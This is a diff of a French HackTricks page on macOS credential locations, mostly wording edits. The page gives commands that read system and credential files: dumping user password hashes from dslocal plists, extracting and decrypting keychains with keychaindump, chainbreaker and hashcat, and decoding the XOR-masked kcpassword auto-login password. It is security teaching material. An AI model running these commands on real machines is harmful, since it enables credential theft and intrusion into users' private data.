@@ -1,33 +1,36 @@
 # Emplacements sensibles de macOS et démons intéressants
 
+{% hint style="success" %}
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Soutenez HackTricks</summary>
 
-Autres façons de soutenir HackTricks :
-
-- Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-- Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
-- **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Mots de passe
 
 ### Mots de passe Shadow
 
 Le mot de passe Shadow est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
-Le oneliner suivant peut être utilisé pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hachage) :
+La commande suivante peut être utilisée pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hachage) : 
+
+{% code overflow="wrap" %}
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
 {% endcode %}
 
-[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-ci**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash en **format hashcat**.
+[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-ci**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash au **format hashcat**.
 
-Une autre commande en une ligne qui va extraire les informations d'identification de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512):
+Une alternative en une seule ligne qui va extraire les informations d'identification de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512):
 
 {% code overflow="wrap" %}
 ```bash
@@ -60,15 +63,15 @@ Un outil nommé **keychaindump** a été développé pour extraire des mots de p
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Après avoir identifié les clés maîtresses potentielles, **keychaindump** recherche à travers les tas un motif spécifique (`0x0000000000000018`) qui indique un candidat pour la clé maîtresse. D'autres étapes, y compris la désobfuscation, sont nécessaires pour utiliser cette clé, comme indiqué dans le code source de **keychaindump**. Les analystes se concentrant sur ce domaine doivent noter que les données cruciales pour décrypter le trousseau de clés sont stockées dans la mémoire du processus **securityd**. Une commande d'exemple pour exécuter **keychaindump** est :
+Après avoir identifié les clés maîtresses potentielles, **keychaindump** recherche à travers les tas une motif spécifique (`0x0000000000000018`) qui indique un candidat pour la clé maîtresse. D'autres étapes, y compris la désobfuscation, sont nécessaires pour utiliser cette clé, comme indiqué dans le code source de **keychaindump**. Les analystes se concentrant sur ce domaine doivent noter que les données cruciales pour décrypter le trousseau de clés sont stockées dans la mémoire du processus **securityd**. Une commande d'exemple pour exécuter **keychaindump** est :
 ```bash
 sudo ./keychaindump
 ```
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un trousseau de clés OSX de manière forensiquement fiable :
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un trousseau d'accès OSX de manière forensiquement fiable :
 
-* Mot de passe du trousseau de clés hashé, adapté pour être craqué avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
+* Mot de passe du trousseau d'accès hashé, adapté pour être craqué avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
 * Mots de passe Internet
 * Mots de passe génériques
 * Clés privées
@@ -77,9 +80,9 @@ sudo ./keychaindump
 * Notes sécurisées
 * Mots de passe Appleshare
 
-Avec le mot de passe de déverrouillage du trousseau de clés, une clé maîtresse obtenue en utilisant [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey, Chainbreaker fournira également les mots de passe en texte brut.
+Avec le mot de passe de déverrouillage du trousseau d'accès, une clé maîtresse obtenue en utilisant [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey, Chainbreaker fournira également les mots de passe en texte clair.
 
-Sans l'une de ces méthodes pour déverrouiller le trousseau de clés, Chainbreaker affichera toutes les autres informations disponibles.
+Sans l'une de ces méthodes pour déverrouiller le trousseau d'accès, Chainbreaker affichera toutes les autres informations disponibles.
 
 #### **Dump keychain keys**
 ```bash
@@ -103,9 +106,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Extraire les clés du trousseau (avec les mots de passe) avec une copie de la mémoire**
+#### **Extraire les clés du trousseau (avec les mots de passe) avec un dump mémoire**
 
-[Suivez ces étapes](../#dumping-memory-with-osxpmem) pour effectuer une **copie de la mémoire**
+[Suivez ces étapes](../#dumping-memory-with-osxpmem) pour effectuer un **dump mémoire**
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -126,7 +129,7 @@ python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library
 Le fichier **kcpassword** est un fichier qui contient le **mot de passe de connexion de l'utilisateur**, mais uniquement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l'utilisateur sera connecté automatiquement sans être invité à saisir un mot de passe (ce qui n'est pas très sécurisé).
 
 Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xoré avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l'utilisateur est plus long que la clé, la clé sera réutilisée.\
-Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).
+Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d). 
 
 ## Informations intéressantes dans les bases de données
 
@@ -142,7 +145,7 @@ sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 
 Vous pouvez trouver les données des Notifications dans `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
 
-La plupart des informations intéressantes seront dans **blob**. Vous devrez donc **extraire** ce contenu et le **transformer** en un format **lisible par l'homme** ou utiliser **`strings`**. Pour y accéder, vous pouvez faire :
+La plupart des informations intéressantes se trouvent dans le **blob**. Vous devrez donc **extraire** ce contenu et le **transformer** en un format **lisible par l'homme** ou utiliser **`strings`**. Pour y accéder, vous pouvez faire :
 
 {% code overflow="wrap" %}
 ```bash
@@ -220,5 +223,5 @@ Il est également possible d'obtenir des informations sur le démon et les conne
 Ce sont des notifications que l'utilisateur devrait voir à l'écran :
 
 * **`CFUserNotification`** : Cette API fournit un moyen d'afficher à l'écran une fenêtre contextuelle avec un message.
-* **Le tableau d'affichage** : Cela s'affiche dans iOS sous forme de bannière qui disparaît et sera stockée dans le Centre de notifications.
+* **Le tableau d'affichage** : Cela affiche sur iOS une bannière qui disparaît et sera stockée dans le Centre de notifications.
 * **`NSUserNotificationCenter`** : Il s'agit du tableau d'affichage iOS sur MacOS. La base de données des notifications est située dans `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
